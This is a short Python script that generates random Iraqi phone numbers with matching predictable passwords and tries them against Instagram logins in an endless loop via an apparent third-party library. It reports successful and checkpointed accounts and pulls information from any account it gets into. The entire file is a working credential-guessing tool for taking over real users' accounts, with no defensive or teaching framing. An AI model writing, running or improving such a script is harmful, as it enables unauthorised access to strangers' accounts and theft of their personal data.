from MrGps import Connection,Login
from colorama import Fore
from random import choice

make = '0987654321'

while True:
	us = str(''.join(choice(make)for i in range(8)))
	email = '+96477'+us
	passwd = '077'+us
	
	login = Login.Instagram(email,passwd)
	
	if 'True' in login:
		print(Fore.GREEN+'True : ',email,':',passwd)
		information = Connection.Instagram(email,passwd)
		print(information)
	elif 'Checkpoint' in login:
		print(Fore.YELLOW+'Checkpoint : ',email,':',passwd)
		
	else:
		print(Fore.RED+'Bad : ',email,':',passwd)
